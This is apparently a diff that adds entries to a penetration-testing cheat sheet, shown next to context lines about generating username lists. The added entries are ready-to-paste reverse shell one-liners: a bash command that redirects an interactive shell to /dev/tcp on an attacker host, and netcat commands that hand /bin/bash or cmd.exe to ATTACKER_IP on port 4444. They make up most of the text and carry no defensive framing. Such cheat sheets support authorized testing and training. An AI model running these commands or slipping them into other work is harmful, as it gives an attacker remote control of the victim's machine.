@@ -8060,3 +8060,16 @@ sed -i '/^1/d' <FILE>.txt
 ```c
 ./username-anarchy -f first,first.last,last,flast,f.last -i <FILE>
 ```
+
+#### Bash Reverse Shell
+
+```c
+bash -c "bash -i >& /dev/tcp/YOUR_ATTACKER_IP/4444 0>&1"
+```
+
+#### nc Reverse Shell
+
+```c
+nc ATTACKER_IP 4444 -e /bin/bash
+nc ATTACKER_IP 4444 -e cmd.exe
+```
